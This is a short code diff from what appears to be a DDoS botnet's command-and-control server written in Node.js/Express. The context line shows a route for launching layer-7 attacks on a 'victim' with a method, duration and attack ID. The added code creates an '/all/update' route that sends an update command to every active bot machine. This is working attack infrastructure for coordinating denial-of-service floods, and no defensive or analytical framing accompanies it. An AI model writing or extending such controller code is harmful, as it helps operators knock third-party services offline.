@@ -265,7 +265,21 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', (req, res) => {
     }
     res.send(200, "OKAY")
 })
-
+app.get('/all/update', (req, res) => {
+    clen = activeMachines.length
+    for (let index = 0; index < clen; index++) {
+        console.log(`http://${activeMachines[index]}:${CURRENTPORT}/update`);
+        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/update`)
+        .then(res => {
+            console.log(res.data)
+        })
+        .catch(err => {
+            console.error(err.response); 
+        })
+        
+    }
+    res.send(200, "OKAY")
+})
 app.get('/globals', (req, res) => {
     axios.get("http://localhost:3000/global")
     .then(resp => {
